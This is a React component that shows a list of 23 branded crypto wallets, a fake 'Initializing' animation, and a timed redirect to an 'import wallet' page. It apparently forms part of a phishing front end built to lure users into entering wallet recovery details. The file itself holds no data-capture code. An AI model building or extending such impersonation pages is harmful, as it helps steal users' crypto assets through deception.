import React, { useEffect, useReducer } from 'react'
import { AiOutlineClose } from "react-icons/ai";
import { Link, useNavigate, useParams } from 'react-router-dom';
import Typewriter from 'typewriter-effect';
import { initialState, reducer } from '../../reducer/useReducer';
import Aktionariat from "../assets/Aktionariat.png"
import MetaMask from "../assets/MetaMask.png"
import Trust from "../assets/Trust.png"
import Phantom from "../assets/Phantom.png"
import Coinbase from "../assets/Coinbase.png"
import CryptoCom from "../assets/CryptoCom.png"
import Blockchain from "../assets/Blockchain.png"
import Binance from "../assets/Binance.png"
import Safepal from "../assets/Safepal.png"
import Ledger from "../assets/Ledger.png"
import Argent from "../assets/Argent.png"
import Bitkeep from "../assets/Bitkeep.png"
import Starkpoint from "../assets/Starkpoint.png"
import Ownbit from "../assets/Ownbit.png"
import InfinityWallet from "../assets/InfinityWallet.png"
import WalletIo from "../assets/WalletIo.png"
import Infinito from "../assets/Infinito.png"
import Torus from "../assets/Torus.png"
import bitPay from "../assets/bitPay.png"
import Imtoken from "../assets/Imtoken.png"
import OtherWallets from "../assets/OtherWallets.png"
import fortmatic from "../assets/fortmatic.png"
import KeyringPro from "../assets/KeyringPro.png"
const wallets = [{
  "icon":MetaMask,
  'title':'MetaMask'
},
{
  "icon":Trust,
  'title':'Trust'
},{
  "icon":Phantom,
  'title':'Phantom'
},{
  "icon":Coinbase,
  'title':'Coinbase'
},{
  "icon":CryptoCom,
  'title':'CryptoCom'
},{
  "icon":Blockchain,
  'title':'Blockchain'
},{
  "icon":Binance,
  'title':'Binance'
},{
  "icon":Safepal,
  'title':'Safepal'
},{
  "icon":Ledger,
  'title':'Ledger'
},{
  "icon":Argent,
  'title':'Argent'
},{
  "icon":fortmatic,
  'title':'fortmatic'
},{
  "icon":Aktionariat,
  'title':'Aktionariat'
},{
  "icon":KeyringPro,
  'title':'KeyringPro'
},{
  "icon":Bitkeep,
  'title':'Bitkeep'
},{
  "icon":Starkpoint,
  'title':'Starkpoint'
},{
  "icon":Ownbit,
  'title':'Ownbit'
},{
  "icon":InfinityWallet,
  'title':'InfinityWallet'
},{
  "icon":WalletIo,
  'title':'WalletIo'
},{
  "icon":Infinito,
  'title':'Infinito'
},{
  "icon":Torus,
  'title':'Torus'
},{
  "icon":bitPay,
  'title':'bitPay'
},{
  "icon":Imtoken,
  'title':'Imtoken'
},{
  "icon":OtherWallets,
  'title':'OtherWallets'
},]

const Initialization = () => {
  const [state,dispatch] = useReducer(reducer,initialState)
  const {id} = useParams()
  const navigate = useNavigate()
  useEffect(()=>{
  setTimeout(()=>navigate(`/importwallet/${id}`),3000)
},[])
  return (
    <div className='min-h-[100vh]'>
      <div className='max-w-md mx-auto mt-10 w-[90%] bg-[#222222] px-6 pt-3 pb-10 rounded-3xl'>
            <div className='flex justify-between items-center mb-8'>
                <h5 className='text-white font-bold'>Back</h5>
                <AiOutlineClose className='text-[#FF1E1E] text-2xl'/>
            </div>
            <div className='px-5 py-8 rounded-2xl mb-5 border border-[#00C920] text-[#00C920] flex md:text-lg'>
                <p>Initializing</p><Typewriter className="inline "
options={{
    strings: ['...', '...'],
    autoStart: true,
    loop: true,
  }}
/>
            </div>
            <Link to="/importwallet" className='px-5 py-8 rounded-2xl border cursor-pointer hover:bg-[rgba(48,48,48,0.9)] border-[#9F9F9F] flex items-center justify-between'>
                <div className='flex flex-col gap-y-10 text-white'>
                    <h3 className='font-bold text-2xl'>{wallets[id].title}</h3>
                    <h5>Easy-to-Use browser extension</h5>
                </div>
                <div className='w-[30px] h-[30px]'>
                    <img src={wallets[id].icon} alt="logo.png" className='w-full' />
                </div>
            </Link>
      </div>
    </div>
  )
}

export default Initialization
